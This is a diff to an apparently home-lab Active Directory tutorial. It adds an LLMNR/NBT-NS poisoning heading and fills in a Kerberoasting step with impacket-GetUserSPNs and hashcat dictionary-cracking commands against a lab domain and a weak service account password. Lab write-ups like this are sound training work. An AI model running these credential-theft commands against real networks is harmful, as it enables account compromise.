@@ -337,7 +337,7 @@ We will add users, file share, and sharing account
 
 
 - Next copy the administrator 
- - Username = SQLService Password = Password123#
+ - Username = SQLService Password = Password123
 
 
 ![image](https://user-images.githubusercontent.com/38595857/216215487-ab34d0ee-0cf2-44b3-855f-0311c7d74647.png)
@@ -439,6 +439,13 @@ we will build out user machines
 
 
 # Step 10
+we will do	LLMNR/NBT-NS Poisoning 
+
+
+
+
+
+# Step 11
 
 Now lets perform a Kerberoasting attack
 
@@ -459,7 +466,7 @@ Now lets perform a Kerberoasting attack
 ![image](https://user-images.githubusercontent.com/38595857/216229363-279281f9-1a52-4699-85b0-d1c52b159c5f.png)
 
 - We are now able to Kerberoast the account using the command
-- impacket-GetUserSPNs -dc-ip 192.168.11.128 SOCCER.local/Username
+- impacket-GetUserSPNs -dc-ip 192.168.11.128 SOCCER.local/SQLService
 - Enter the password
 
 
@@ -482,9 +489,10 @@ Now lets perform a Kerberoasting attack
 - hashcat -m 13100 -a 0 hash.txt wordlist.txt --force
 - -a 0 = dicationary attack
 
+![image](https://user-images.githubusercontent.com/38595857/216353309-df1ce4cb-315a-4070-bd00-a798015a26b3.png)
 
 
-
+- PASSWORD IS CRACKED
  
  
  
